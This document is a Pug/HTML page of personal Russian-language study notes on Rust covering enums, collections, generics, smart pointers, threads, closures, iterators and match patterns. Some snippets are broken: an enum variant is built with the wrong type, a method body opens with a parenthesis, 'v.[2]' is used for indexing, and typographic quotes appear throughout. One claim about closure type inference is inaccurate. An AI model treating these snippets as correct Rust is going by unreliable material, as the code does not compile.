          Метод - поведение экземпляра<br>
          Ассоциированная функция - поведение структуры<br>
          Перечисления (enumerations, enums) дают способ сказать, что значение является одним из возможных наборов значений, структура данных enum.<br>
          В любой из вариантов перечисления можно поместить данные:
        pre
          code.
            enum IpAddr {
              V4(String),
              V6(String),
            }
            let home = IpAddr::V4(String::from(“127.0.0.1”));
            let loopback = IpAddr::V6(String::from(“ : :1”));
        br
        p.
          Каждый вариант перечисления (V4, V6) - это функция, которая создаёт экземпляр перечисления, т.е. принимает String и возвращает экземпляр типа IpAddr, это функция-конструктор.<br>
          В отличии от структуры (struct) перечисление (enum) может иметь разное количество данных в разных типах, можно включать перечисления в другие перечсления.<br>
        pre
          code.
            enum IpAddr {
              V4(u8, u8, u8, u8),
              V6(String),
            }
            let home = IpAddr::V4(String::from(“127.0.0.1”));
            let loopback = IpAddr::V6(String::from(“ : :1”));
        br
        p.
          С помощью impl блока, мы можем определять методы для перечисления.<br>
          Тип Option кодирует сценарий, в котором значение может быть чем-то, а может быть ничем.
        pre
          code.
            enum Option < T> {
              None,
              Some (T),
            }
        br
        p.
          Нужно познакомиться с методами перечисления <b>Option &lt;T&gt;</b> в документации.<br>
          Перечисление <b>Option &lt;T&gt;</b> и его варианты <b>Some</b> и <b>None</b> включены в прелюдию.<br>
          Поэтому Option не нужно вводить в область видимости, а Some и None используем без префикса <b>Option::</b>.<br>
          Чтобы иметь значение, которое может быть <b>null</b> его тип нужно явно описать с помощью <b>Option &lt;T&gt;</b> и явно обрабатывать случай, когда значение равно null.<br>
          Значение может быть равно null только имея тип Option &lt;T&gt;, в остальных случаях (с другими типами) значение всегда not-null.<br>
          Если использовать pub перед определением структуры, то это делает структуру публичной, но поля этой структуры остаются приватными.<br>
          Чтобы поле структуры стало публичным добавляем pub.<br>
          Если сделать перечисление общедоступным pub enum, то все его варианты будут общедоступными.<br>
          Коллекция хранит множество однотипных значений в куче, т.е. размер коллекции может быть не известен в момент компиляции, может изменяться в размере во время работы программы.<br>
          Каждый вид коллекции имеет свои возможности:<br>
          <dfn>Вектор (Vector)</dfn> - сохраняет различное количество последовательно хранящихся значений.<br>
          <dfn>Строка (String)</dfn> - последовательность символов.<br>
          <dfn>Хеш-таблица (hash map)</dfn> - коллекция, которая позволяет хранить перечень ассоциаций значения с ключом (перечень пар ключ: значение).<br>
          Коллекция вектор (vector): Vec &lt;T&gt;<br>
          <br>
          Создание пустого вектора для хранения значений типа i32:
        code let v: Vec< i32> = Vec::new();
        p.
          Макрос vec! - создает новый вектор.
          новый вектор целочисленного типа i32 со значениями 1, 2, 3
        pre
          code.
            let v = vec![1, 2, 3];

            <span>Создать новый вектор и добавить значения:</span>
            let mut v = Vec::new();
            v.push(5);
            v.push(6);
            v.push(7);
            v.push(8);
        p.
          Доступ к элементу вектора:<br>
          <b>v.[2]</b> - индекс (нумерация индексов с 0)<br>
          <b>v.get(2)</b> - метод get, получаем тип <b>Option<&T></b><br>
          При обращении по индексу за пределами вектора, произойдет паника.<br>
          При обращении к индексу за пределами вектора через get - вернется None без паники.<br>
          Получение неизменяемых ссылок на каждый элемент в векторе:
        pre
          code.
            let v = vec![100, 32, 57];
            for i in &v {
              println!(“{}”, i);
            }

            <span>Добавление к каждому элементу вектора:</span>
            let mut v = vec![100, 32, 57];
            for i in &mut v {
              *i += 50;
            }
        p.
          *i - получение значения переменной i с помощью оператора разыменовывания ссылки *.<br>
          Строки (String) реализованы в виде набора байтов.<br>
          В Rust есть только один строковый тип в ядре языка - срез строки &str.<br>
          Тип String предоставляется стандартной библиотекой.<br>
          И String и строковые срезы &str кодируются в UTF-8.<br>
          String фактически реализован как обертка вокруг вектора байтов.<br>
          СТАНДАРТНУЮ БИБЛИОТЕКУ ВЫУЧИТЬ!!!<br>
          Индексирование строк это плохая идея, т.к. не ясно каким должен быть возвращаемый тип такой операции:<br>
          байтовым значением (код UTF-8), символом (char), кластером графем или срезом строки.<br>
          Коллекция hash map (хеш карта).<br>
          Тип HashMap &lt;K, V&gt; хранит ключ типа К на значение типа V.<br>
          Организует и хранит данные с помощью функции хеширования.<br>
          Как и векторы, HashMap однородны: все ключи должны иметь одинаковый тип и все значения должны иметь одинаковый тип.<br>
          По умолчанию HashMap использует функцию хеширования SipHach, который может противостоять Dos-атакам с использованием таблиц siphash.<br>
          Обобщённые типы данных generics - это абстрактные подставные типы на место которых возможно поставить какой-либо конкретный тип или другое свойство.<br>
          (Option&lt;T>, Vec&lt;T&gt;, HashMap&lt;K, V&gt;, Result&lt;T, E&gt;).<br>
          Мы используем обобщённые типы данных для объявления функций или структур, которые затем можно использовать с различными конкретными типами данных.<br>
          <b>fn largest&lt;T&gt;(list: &[T]) -> &T {}</b><br>
          Объявление читается так: функция largest является обобщённой по типу T.<br>
          Эта функция имеет один параметр с именем list, который является срезом значений с типом данных T.<br>
          Функция largest возвращает значение этого же типа T.<br>
          Синтаксис использования обобщённых типов в определении структуры такой же как у функции.<br>
          Объявляем имена типов параметров внутри треугольных скобок сразу после названия структуры.<br>
          Мы также можем определить структуры, использующие обобщённые типы в одном или нескольких своих полях, с помощью синтаксиса <b><></b>.<br>
          Поля структуры с обопщенным типом имеют одинаковый тип, каким бы он не являлся.<br>
          Чтобы определить структуру Point, где оба значения x и y являются обобщёнными, но различными типами, можно использовать несколько параметров обобщённого типа.
        pre
          code.
            struct Point< T, U> {
              x: T,
              y: U,
            }
        br
        p.
          Определение методов может использовать обобщённые типы: <b>impl&lt;T&gt; Point&lt;T&gt; {}</b><br>
          Мономорфизация — это процесс превращения обобщённого кода в конкретный код путём подстановки конкретных типов, использующихся при компиляции.<br>
          <dfn>&lt;Т&gt;</dfn> - обопщенный тип.<br>
          Bы можете реэкспортировать элементы, чтобы сделать публичную структуру, отличную от вашей внутренней структуры, используя pub use.<br>
          <dfn>Box&lt;T&gt;</dfn> для распределения значений в куче (памяти).<br>
          <dfn>Rc&lt;T&gt;</dfn> тип счётчика ссылок, который допускает множественное владение.<br>
          Типы Ref&lt;T&gt; и RefMut&lt;T&gt;, доступ к которым осуществляется через тип RefCell&lt;T&gt;, который обеспечивает правила заимствования во время выполнения вместо времени компиляции.<br>
          Тип Box&lt;T&gt; является умным указателем, поскольку он реализует трейт <b>Deref</b>, который позволяет обрабатывать значения Box&lt;T&gt; как ссылки. Когда значение Box&lt;T&gt; выходит из области видимости, данные кучи, на которые указывает box, также очищаются благодаря реализации типажа <b>Drop</b>.<br>
          Устанавливаем y как экземпляр Box&lt;T&gt;, указывающий на скопированное значение x, а не как ссылку, указывающую на значение x.<br>
          Без типажа Deref компилятор может только разыменовывать & ссылки.<br>Метод deref даёт компилятору возможность принимать значение любого типа, реализующего Deref и вызывать метод deref чтобы получить ссылку &, которую он знает, как разыменовывать.<br>
          Когда типаж Deref определён для задействованных типов, Rust проанализирует типы и будет использовать Deref::deref столько раз, сколько необходимо, чтобы получить ссылку, соответствующую типу параметра.<br>
          Rust выполняет разыменованное приведение, когда находит типы и реализации типажей в трёх случаях:<br>
          Из типа &T в тип &U когда верно T: Deref&lt;Target=U&gt;<br>
          Из типа &mut T в тип &mut U когда верно T: DerefMut&lt;Target=U&gt;<br>
          Из типа &mut T в тип &U когда верно T: Deref&lt;Target=U&gt;<br>
          Rust также приводит изменяемую ссылку к неизменяемой.<br>
          Но обратное не представляется возможным:<br>
          неизменяемые ссылки никогда не приводятся к изменяемым ссылкам.<br>
          Drop позволяет регулировать, что происходит, когда значение вот-вот выйдет из области видимости.<br>
          Тело функции drop - это место, где должна располагаться вся логика, которую вы захотите выполнять, когда экземпляр вашего типа выйдет из области видимости.<br>
          Rust автоматически вызывал функцию drop в момент выхода наших экземпляров из области видимости, тем самым выполнив заданный нами в drop код.<br>
          Переменные ликвидируются в обратном порядке их создания.<br>
          Rust не позволяет вызвать метод типажа Drop вручную;<br> вместо этого вы должны вызвать функцию <b>std::mem::drop</b> предоставляемую стандартной библиотекой, если хотите принудительно удалить значение до конца области видимости.<br>
          Тип Rc&lt;T&gt; отслеживает количество ссылок на значение, чтобы определить, используется ли оно ещё.<br>
          Если ссылок на значение нет, значение может быть очищено и при этом ни одна ссылка не станет недействительной.<br>
          Тип Rc&lt;T&gt; используется, когда мы хотим разместить в куче некоторые данные для чтения несколькими частями нашей программы и не можем определить во время компиляции, какая из частей завершит использование данных последней.<br>
          Обратите внимание, что Rc&lt;T&gt; используется только в одно поточных сценариях.<br>
          Вызов <b>Rc::clone</b> только увеличивает счётчик ссылок, что не занимает много времени.<br>
          Внутренняя изменяемость - это паттерн проектирования Rust, который позволяет вам изменять данные даже при наличии неизменяемых ссылок на эти данные; обычно такое действие запрещено правилами заимствования.<br>
          RefCell&lt;T&gt; предоставляет единоличное владение данными, которые он содержит.<br>
          С помощью ссылок и типа Box&lt;T&gt; инварианты правил заимствования применяются на этапе компиляции.<br>
          С помощью RefCell&lt;T&gt; они применяются во время работы программы.<br>
          Тип RefCell&lt;T&gt; полезен, когда вы уверены, что ваш код соответствует правилам заимствования, но компилятор не может понять и гарантировать этого.<br>
          Вот список причин выбора типов Box&lt;T&gt;, Rc&lt;T&gt; или RefCell&lt;T&gt;:<br>
          Тип <b>Rc&lt;T&gt;</b> разрешает множественное владение одними и теми же данными; типы Box&lt;T&gt; и RefCell&lt;T&gt; разрешают иметь единственных владельцев.<br>
          Тип <b>Box&lt;T&gt;</b> разрешает неизменяемые или изменяемые владения, проверенные при компиляции;
          тип <b>Rc&lt;T&gt;</b> разрешает только неизменяемые владения, проверенные при компиляции;<br>
          тип <b>RefCell&lt;T&gt;</b> разрешает неизменяемые или изменяемые владения, проверенные во время выполнения.<br>
          Поскольку RefCell&lt;T&gt; разрешает изменяемые заимствования, проверенные во время выполнения, можно изменять значение внутри RefCell&lt;T&gt; даже если RefCell&lt;T&gt; является неизменным.<br>
          Изменение значения внутри неизменного значения является шаблоном внутренней изменяемости (interior mutability).<br>
          Инсценировочные (Mock) объекты - это особый тип тестовых дублёров, которые сохраняют данные происходящих во время теста действий тем самым позволяя вам убедиться впоследствии, что все действия были выполнены правильно.<br>
          Вызвать образование ссылочной зацикленности не просто, но и не невозможно.<br>
          Если у вас есть значения RefCell&lt;T&gt; которые содержат значения Rc&lt;T&gt; или аналогичные вложенные комбинации типов с внутренней изменчивостью и подсчётом ссылок, вы должны убедиться, что вы не создаёте зацикленность.<br>
          Тип <b>Box&lt;T&gt;</b> имеет известный размер и указывает на данные размещённые в куче.<br>
          Тип <b>Rc&lt;T&gt;</b> отслеживает количество ссылок на данные в куче, поэтому данные могут иметь несколько владельцев.<br>
          Тип <b>RefCell&lt;T&gt;</b> с его внутренней изменяемостью предоставляет тип, который можно использовать при необходимости неизменного типа, но необходимости изменить внутреннее значение этого типа; он также обеспечивает соблюдение правил заимствования во время выполнения, а не во время компиляции.<br>
          <dfn>Mutex</dfn> - это сокращение от взаимное исключение (mutual exclusion), так как мьютекс позволяет только одному потоку получать доступ к некоторым данным в любой момент времени.<br>
          Для того, чтобы получить доступ к данным в мьютексе, поток должен сначала подать сигнал, что он хочет получить доступ запрашивая блокировку (lock) мьютекса.<br>
          <dfn>Блокировка</dfn> - это структура данных, являющаяся частью мьютекса, которая отслеживает кто в настоящее время имеет эксклюзивный доступ к данным.<br>
          Поэтому мьютекс описывается как объект защищающий данные, которые он хранит через систему блокировки.<br>
          <b>Mutex&lt;T&gt;</b> является умным указателем, точнее, вызов lock возвращает умный указатель, называемый <b>MutexGuard</b>, обёрнутый в <b>LockResult</b>, который мы обработали с помощью вызова unwrap.<br>
          Умный указатель типа MutexGuard реализует типаж Deref для указания на внутренние данные;<br>
          умный указатель также имеет реализацию типажа Drop, автоматически снимающего блокировку, когда MutexGuard выходит из области видимости.<br>
          Arc&lt;T&gt; является типом аналогичным типу Rc&lt;T&gt;, который безопасен для использования в ситуациях многопоточности.<br>
          Буква А означает атомарное, что означает тип ссылка подсчитываемая атомарно.<br>
          <dfn>Atomics</dfn> - работают как примитивные типы, но безопасны для совместного использования между потоками: дополнительную информацию смотрите в документации стандартной библиотеки для <b>std::sync::atomic</b>.
          Cтандартные типы библиотек не реализованы для использования вместе с типом Arc&lt;T&gt; по умолчанию.<br>
          Причина в том, что безопасность потоков сопровождается снижением производительности.<br>
          типы Arc&lt;T&gt; и Rc&lt;T&gt; имеют одинаковый API.<br>
          Mutex&lt;T&gt; сопряжён с риском создания взаимных блокировок (deadlocks).<br>
          Это происходит, когда операции необходимо заблокировать два ресурса и каждый из двух потоков получил одну из блокировок, заставляя оба потока ждать друг друга вечно.<br>
          В язык встроены две концепции многопоточности: <b>std::marker</b> типажи <b>Sync</b> и <b>Send</b>.<br>
          Маркерный типаж Send указывает, что владение типом реализующим Send, может передаваться между потоками.<br>
          Почти каждый тип Rust является типом Send, но есть некоторые исключения, вроде Rc&lt;T&gt;:<br>
          он не может быть Send, потому что если вы клонировали значение Rc&lt;T&gt;<br>
          и попытались передать владение клоном в другой поток, оба потока могут обновить счётчик ссылок одновременно.<br>
          По этой причине Rc&lt;T&gt; реализован для использования в однопоточных ситуациях, когда вы не хотите платить за снижение производительности.<br>
          Маркерный типаж Sync указывает, что на тип реализующий Sync можно безопасно ссылаться из нескольких потоков.<br>
          Другими словами, любой тип T является типом Sync, если &T (ссылка на T) является типом Send, что означает что ссылку можно безопасно отправить в другой поток.<br>
          Подобно Send, примитивные типы являются типом Sync, а типы полностью скомбинированные из типов Sync, также являются Sync типом.<br>
          Умный указатель Rc&lt;T&gt; не является Sync типом по тем же причинам, по которым он не является Send.<br>
          Тип RefCell&lt;T&gt; и семейство связанных типов Cell&lt;T&gt; не являются Sync.<br>
          Этот код позволяет нам разбивать сложные типы на составные части, чтобы мы могли использовать интересующие нас значения по отдельности.<br>
          Деструктуризация с помощью шаблонов - это удобный способ использования фрагментов значений, таких как как значение из каждого поля в структуре, по отдельности друг друга.<br>
          <dfn>Ассоциированные типы</dfn> (Associated types) связывают заполнитель типа с типажом, таким образом, что объявления методов типажа могут использовать эти заполнители типов в своих сигнатурах.<br>
          С ассоциированными типами не нужно аннотировать типы, потому что мы не можем реализовать типаж у типа несколько раз.<br>
          Тип по умолчанию указывается при объявлении обобщённого типа с помощью синтаксиса &lt;PlaceholderType=ConcreteType&gt;.<br>
          Rust не позволяет создавать собственные операторы или перегружать произвольные операторы.<br>
          Но можно перегрузить перечисленные операции и соответствующие им типажи из <b>std::ops</b> путём реализации типажей, связанных с этими операторами.<br>
        pre
          code.
              <span>Integer addition</span>
              assert!(1u32 + 2u32 == 3u32);

              <span>Integer subtraction</span>
              assert!(1i32 - 2 == -1);
              assert!(1i32 - 2 == -1); 
              assert!(3 * 50 == 150);
              assert!(9.6f32 / 3.2f32 == 3.0);
              assert!(24 % 5 == 4);

              <span>Short-circuiting boolean logic</span>
              assert!(true && false == false);
              assert!(true || false == true);
              assert!(!true == false);

      //- Function
      details
        summary Function
        p.
          fn - объявление функции<br>
          fn main ( ) { } - точка входа в программу<br>
          fn another_function ( ); - определение функции<br>
          another_function ( ); - вызов функции<br>
          another_function (5); - вызов функции с передачей значения “5” как аргумент (параметр) функции.<br>
          Объявлять тип каждого параметра сигнатуры функции обязательно:<br>
        code fn another_function (valu: i32, label: char) { };
        p.
          Методы как и функции:<br>
          - ключевое слово fn<br>
          - имеют параметры и возвращаемое значение<br>
          - содержат код, который выполняется при вызове<br>
          Методы - это функции, которые определяются в контексте структуры.<br>
          Первый параметр метода всегда self - экземпляр структуры, на который вызывается метод.<br>
        pre
          code.
            impl Rectangle {
              fn area (&self) -> u32 (
                self.width * self.height
              }
            }
        p.
          Создание блока <dfn>impl</dfn> (implementation - реализация) определяет функцию area в контексте типа Rectangle.<br>
          rect1.area() - вызов метода area на экземпляре rect1 типа Rectangle.<br>
          Всё, что хотим сделать с экземпляром типа, помещаем в один блок impl.<br>
          Методу можно давать имя такое же как и у поля структуры.<br>
          Отличие в обращении - это наличие круглых скобок у метода.<br>
          Как правило, метод с таким же именем как у поля возвращает значение этого поля.<br>
          Такие методы называются геттерами.<br>
          Все функции определенные в блоке impl, называются ассоциированными функциями, потому что они ассоциированы с типом, указанным после ключевого слова impl.<br>
          Можно определить ассоциированные функции без self в качестве первого параметра.<br>
          Такие функции не являются методами и их часто используют для конструкторов, возвращающих новый экземпляр структуры.<br>
          Вызвать ассоциированную функцию можно через ::.<br>
          <dfn>::</dfn> - это синтаксис для обращения к ассоциированным функциям и к пространству имен, созданое модулем.<br>
          <dfn>Ассоциированная функция</dfn> - в блоке impl<br>
          <dfn>Ассоциированная функция</dfn> в контексте структуры - метод<br>
          <dfn>Ассоциированная функция</dfn> без параметра self - конструктор<br>
          <dfn>Замыкания</dfn> - конструкции, подобные функциям, которые можно помещать в переменные<br>
          <dfn>Замыкания</dfn>: анонимные функции, которые запечатлевают ("захватывают") своё окружение.<br>
          <dfn>Замыкания</dfn> в Rust - это анонимные функции, которые можно сохранять в переменных или передавать в качестве аргументов другим функциям.<br>
          В отличие от функций, замыкания могут использовать значения из области видимости в которой они были определены.<br>
        pre
          code.
            fn giveaway(&self, user_preference: Option< ShirtColor>) -> ShirtColor {
              user_preference.unwrap_or_else(|| self.most_stocked())
            }
        p.
          <b>|| self.most_stocked()</b> - замыкание<br>
          || - между вертикальными линиями указываются параметры<br>
          self.most_stocked() - тело замыкания<br>
          Замыкания, как правило, короткие и уместны только в узком контексте, а не в произвольном сценарии.<br>
          Определение функции и замыкания:<br>
          <b>fn add_one_v1 (x: u32) -> u32 { x + 1 }</b> - функция<br>
          <b>let add_one_v2 = |x: u32| -> u32 { x + 1 };</b> - замыкание с полной аннотацией<br>
          <b>let add_one_v3 = |x|</b><br>
          <b>{ x + 1 };</b> - замыкание без аннотации типа<br>
          <b>let add_one_v4 = |x|</b><br>
          <b>x + 1 ;</b> - в теле замыкания одна операция, скобки не нужны.<br>
          Строки add_one_v3 и add_one_v4 требуют, чтобы замыкания были вычислены до компиляции, поскольку типы будут выведены из их использования.<br>
          Замыкания могут захватывать значения из своего окружения тремя способами, которые соответствуют тем же трём способам, которыми функция может принимать параметры:<br> заимствование неизменяемых, заимствование изменяемых и получение владения.<br>
          Замыкание самостоятельно определяет, какой из этих способов использовать, исходя из того, что тело функции делает с полученными значениями.<br>
          Если вы хотите заставить замыкание принять владение значениями, которые оно использует в окружении, даже если в теле замыкания нет кода, требующего владения, вы можете использовать ключевое слово move перед списком параметров.<br>
          Замыканиям автоматически присваивается реализация одного, двух или всех трёх из нижеперечисленных трейтов Fn, аддитивным образом, в зависимости от того, как тело замыкания обрабатывает значения:<br>
          <dfn>FnOnce</dfn> применяется к замыканиям, которые могут быть вызваны один раз.<br>
          Все замыкания реализуют по крайней мере этот трейт, потому что все замыкания могут быть вызваны.<br>
          Замыкание, которое перемещает захваченные значения из своего тела, реализует только FnOnce и ни один из других признаков Fn, потому что оно может быть вызвано только один раз.<br>
          <dfn>FnMut</dfn> применяется к замыканиям, которые не перемещают захваченные значения из своего тела, но
          могут изменять захваченные значения.<br>
          Такие замыкания могут вызываться более одного раза.<br>
          <dfn>Fn</dfn> применяется к замыканиям, которые не перемещают захваченные значения из своего тела и не модифицируют захваченные значения, а также к замыканиям, которые ничего не захватывают из своего окружения.<br>
          Такие замыкания могут выполняться более одного раза и не меняют ничего в своём окружении, что важно в таких случаях, как одновременный вызов замыкания несколько раз.<br>
          <dfn>Трейты Fn</dfn> важны при определении или использовании функций или типов, использующих замыкания.<br>
          <dfn>Итераторы</dfn> — способ обработки последовательности элементов.<br>
          Использование паттерна Итератор помогает при необходимости поочерёдного выполнения какой-либо операции над элементами последовательности.<br>
          Итератор отвечает за логику перебора элементов и определение момента завершения последовательности.<br>
          Все итераторы реализуют типаж Iterator, который определён в стандартной библиотеке.<br>
          Метод iter создаёт итератор по неизменяемым ссылкам.<br>
          Если мы хотим создать итератор, который становится владельцем v1 и возвращает принадлежащие ему значения, мы можем вызвать into_iter вместо iter.<br>
          Точно так же, если мы хотим перебирать изменяемые ссылки, мы можем вызвать iter_mut вместо iter.<br>
          Методы, вызывающие next, называются потребляющими адаптерами, поскольку их вызов потребляет итератор.<br>
          <dfn>Адаптеры итераторов</dfn> - это методы, определённые для трейта Iterator, которые не потребляют итератор.<br>
          Вместо этого они создают различные итераторы, изменяя некоторые аспекты исходного итератора.<br>
          В Rust итераторы ленивые (lazy), то есть они не делают ничего, пока вы не вызовете специальные методы, потребляющие итератор, чтобы задействовать его.<br>
          Вы можете выстроить цепочку из нескольких вызовов адаптеров итератора для выполнения сложных действий в удобочитаемом виде.<br>
          Но поскольку все итераторы являются "ленивыми", для получения результатов вызовов адаптеров итератора необходимо вызвать один из методов потребляющего адаптера.<br>
          <dfn>Разворачивание</dfn> - это оптимизация, которая устраняет издержки кода управления циклом и вместо этого генерирует повторяющийся код для каждой итерации цикла.<br>
          Реализации замыканий <b>(closures)</b> и итераторов <b>(iterators)</b> таковы, что нет влияния на производительность выполнения кода.<br>
          Это одна из целей Rust, направленных на обеспечение абстракций с нулевой стоимостью (zero-cost abstractions).<br>
          Чтобы создать новый поток, мы вызываем функцию <b>thread::spawn</b> и передаём ей замыкание, содержащее код, который мы хотим запустить в новом потоке.<br>
          Вызовы <b>thread::sleep</b> заставляют поток на короткое время останавливать своё выполнение, позволяя
          выполняться другим потокам.<br>
          Тип возвращаемого значения <b>thread::spawn — JoinHandle</b>.<br>
          <dfn>JoinHandle</dfn> — это владеющее значение, которое, при вызове метода join, будет ждать завершения своего потока.<br>
          Мы будем часто использовать ключевое слово <b>move</b> с замыканиями, переданными в thread::spawn, потому что замыкание будет затем владеть значениями, взятыми из окружающего кода, а значит передаст владение этими значениями от одного потока к другому.<br>
          Добавляя ключевое слово move перед замыканием, мы заставляем замыкание забирать используемые значения во владение, вместо того, чтобы позволить Rust вывести необходимость заимствования значения.<br>
          <br>
          Игнорирование значений в шаблоне.<br>
          Есть несколько способов игнорировать целые значения или части значений в шаблоне:<br>
          используя шаблон <b>_</b> внутри другого шаблона, используя имя, начинающееся с подчёркивания, либо используя <b>..</b>, чтобы игнорировать оставшиеся части значения.<br>
          Игнорирование всего значения с помощью шаблона <b>_</b><br>
          Использование <b>_</b> в сигнатуре функции<br>
        pre
          code.
            fn foo(_: i32, y: i32) {
              println!("This code only uses the y parameter: {}", y);
            }
            fn main() {
              foo(3, 4);
            }
        p.
          Игнорирование параметра функции может быть особенно полезно в случаях когда, например, вы реализуете типаж с определённой сигнатурой, но тело функции в вашей реализации не нуждается в одном из параметров.<br>
          Игнорирование частей значения с помощью вложенного <b>_</b><br>
          Использование подчёркивания в шаблонах, соответствующих вариантам <b>Some</b>, когда нам не нужно использовать значение внутри Some<br>
        pre
          code.
            fn main() {
              let mut setting_value = Some(5);
              let new_setting_value = Some(10);
              match (setting_value, new_setting_value) {
                (Some(_), Some(_)) => {
                  println!("Can't overwrite an existing customized value");
                }
                _ => {
                  setting_value = new_setting_value;
                }
              }
              println!("setting is {:?}", setting_value);
            }
        p Бизнес-требования заключаются в том, что пользователь не должен иметь права перезаписывать существующую настройку параметра, но может сбросить параметр и присвоить ему значение, если он в данный момент не установлен.

      //- Operator
      details
        summary Operator
        p.
          <dfn>Операторы</dfn> - это инструкции, которые выполняют действие и не возвращают значение.<br>
          <dfn>Выражения</dfn> - вычесляют результирующее значение.<br>
          <b>{ }</b> - создают область видимости (scope).<br>
          <b>let</b> - это оператор<br>
          <b>fn</b> - это оператор<br>
          <b>let y = 6;</b> - оператор<br>
          <b>6</b> - выражение<br>
          <b>;</b> - окончание оператора<br>
          <b>fn main ( ) {let y = 6;}</b> - оператор<br>
          <b>{let y = 6;}</b> - выражение<br>
        p.
          Вызов функции, вызов макроса - это выражение.<br>
          Если добавить точку с запятой в конец выражения, то оно превратится в оператор и не вернет значение.<br>
          <b>fn five ( ) -> i32 {5}</b> - функция возвращает значение.<br>
          <b>-> i32 {5}</b> - объявляет тип возвращаемого значения.<br>
          <b>//</b> - комментарий только однострочный<br>
          Область видимости - это диапозон внутри программы, для которого допустим элемент.<br>
          Когда переменная появляется в области видимости, она считается действительной до момента выхода за границы этой области.<br>
          <b>let s = String::from(“hello”);</b> - создать String из строкового литерала.<br>
          Оператор <b>::</b> позволяет использовать пространство имен функции from под типом String.<br>
          <br>
          <dfn>Связанное понятие</dfn> - это область видимости: вложенный контекст в котором написан код имеющий набор имён, которые определены “в текущей области видимости”.<br>
          <b>Оператор * (glob)</b> - включает в область видимости все общедоступные элементы, определенные в пути:<br>
          <b>use std::collections::*;</b><br>
          Сокращение для проброса ошибок: оператор <b>?</b><br>
          Оператор <b>?</b> может использоваться только в функциях, тип возвращаемого значения которых совместим со значением, для которого используется ?.<br>
          Исполняемые файлы, написанные на C, при выходе возвращают целые числа:<br> успешно завершённые программы возвращают целое число 0, а программы с ошибкой возвращают целое число, отличное от 0.<br>
          Rust также возвращает целые числа из исполняемых файлов, чтобы быть совместимым с этим соглашением.<br>
        pre
          code.
            0011 AND 0101 is 0001
            0011 OR 0101 is 0111
            0011 XOR 0101 is 0110
            1 << 5 is 32
            0x80 >> 2 is 0x20

        //- Construction
        details
          summary Construction
          p Условие всегда типа <b>bool</b>:
          code if number < 5 {println!(“Hi!”);} else {println!(“Buy”);}
          p.
            <b>if</b> - выражение<br>
            <b>number < 5</b> - условие<br>
            <b>{println!(“Hi!”);}</b> - ответвление<br>
            <b>println!(“Hi!”);</b> - макрос<br>
            <b>else</b> - выражение<br>
            <b>{println!(“Buy”);}</b> - ответвление<br>
            <b>println!(“Buy”);</b> - макрос<br>
            По очереди проверяется каждое выражение if и выполняется первое тело, для которого условие истино, остальные блоки уже не проверяет.<br>
            <br>
            Управляющая конструкция match:<br>
            Механизм управления потоком, который сравнивает значение с различными шаблонами и выполняет код в зависимости от того, какой из шаблонов совпал.<br>
          pre
            code.
              enum Coin {
                Penny,
                Nickel,
                Dime,
                Quarter,
              }
              fn value_in_cents (coin: Coin) -> u8 {
                match coin {
                  Coin::Penny => 1,
                  Coin::Nickel => 5,
                  Coin::Dime => 10,
                  Coin::Quarter => 25,
                }
              }
          p.
            <b>match coin:</b><br>
            <b>match</b> - ключевое слово<br>
            <b>coin</b> - - выражение, которое возвращает любой тип. В данном случае значение coin.<br>
            <b>Coin::Penny => 1</b>, - ветка<br>
            <b>Coin::Penny</b> - шаблон. В данном случае значение Coin::Penny.<br>
            <b>=></b> - оператор<br>
            <b>1</b> - выражение, код для выполнения. В данном случае значение 1.<br>
            Код, связанный с каждой веткой, является выражением, а полученное значение выражения в соответствующей ветке - это значение, которое возвращается для всего выражения match.<br>
            Если код для выполнения больше одной строки, то в фигурные скобки { } - запятая не обязательно.<br>
            Универсальный шаблон:<br>
          pre
            code.
              let dice_roll = 9;
              match dice_roll {
                3 => add_fancy_hat(),
                7 => remove_fancy_hat(),
                <span>универсальный шаблон с привязкой к значению</span>
                other => move_player(other),
              }
              fn add_fancy_hat () {}
              fn remove_fancy_hat () {}
              fn move_player(num_spaces: u8) {}
          p.
            Для последней ветки шаблоном является переменная, которая передаётся в функцию move_player.<br>
            Последняя ветка является универсальным шаблоном с привязкой к значению переменной шаблона.<br>
            Заполнитель _ - специальный шаблон, который используется если не нужно привязываться к значению.<br>
          pre
            code.
              let dice_roll = 9;
              match dice_roll {
                3 => add_fancy_hat(),
                7 => remove_fancy_hat(),
                <span>универсальный шаблон без привязки к значению</span>
                _=> reroll (),
              }
              fn add_fancy_hat () {}
              fn remove_fancy_hat () {}
              fn reroll () {}
          p Используем пустой кортеж - единичное значение, чтобы обозначить, что не используем никакое другое значение, кроме предыдущих веток и не запускаем никакого кода:
          pre
            code.
              let dice_roll = 9;
              match dice_roll {
                3 => add_fancy_hat(),
                7 => remove_fancy_hat(),
                _=> (),
              }
              fn add_fancy_hat () {}
              fn remove_fancy_hat () {}
          p.
            if let - не запускается если значение не соответствует шаблону.<br>
            Шаблон и выражение разделены знаком равенства.
          pre
            code.
              let config_max = Some (3u8);
              if let Some (max) = config_max {
                println! (“The maximum is configured to be { }”, max);
              }

              <span>Ветки match</span>
              match VALUE {
                PATTERN => EXPRESSION,
                PATTERN => EXPRESSION,
                PATTERN => EXPRESSION,
              }
          p.
            Value - значение<br>
            Pattern - шаблон<br>
            Expression - выражение<br>
            Одно из требований к выражениям match состоит в том, что они должны быть исчерпывающими (exhaustive) в том смысле, что они должны учитывать все возможности для значения в выражении match.<br>
            Шаблон <b>_</b> может быть полезен, если вы, например, хотите игнорировать любое не указанное значение.<br>
            Дополнительные условия оператора сопоставления <b>(Match Guards)</b><br>
            Условие сопоставления (match guard) является дополнительным условием if, указанным после шаблона в ветке match, которое также должно быть выполнено, чтобы ветка была выбрана.<br>
            Условия сопоставления полезны для выражения более сложных идей, чем позволяет только шаблон.<br>
            Добавление условия сопоставления в шаблон
          pre
            code.
              fn main() {
                let num = Some(4);
                match num {
                  Some(x) if x % 2 == 0 => println!("The number {} is even", x),
                  Some(x) => println!("The number {} is odd", x),
                  None => (),
                }
              }
          p Использование условия сопоставления для проверки на равенство со значением внешней переменной
          pre
            code.
              fn main() {
                let x = Some(5);
                let y = 10;
                match x {
                  Some(50) => println!("Got 50"),
                  Some(n) if n == y => println!("Matched, n = {n}"),
                  _ => println!("Default case, x = {:?}", x),
                }
                println!("at the end: x = {:?}, y = {y}", x);
              }
          p Комбинирование нескольких шаблонов с условием сопоставления
          pre
            code.
              fn main() {
                let x = 4;
                let y = false;
                match x {
                  4 | 5 | 6 if y => println!("yes"),
                  _ => println!("no"),
                }
              }
          p.
            приоритет условия сопоставления по отношению к шаблону ведёт себя так:<br>
            <b>(4 | 5 | 6) if y => ...</b><br>
            а не так:<br>
            <b>4 | 5 | (6 if y) => ...</b><br>
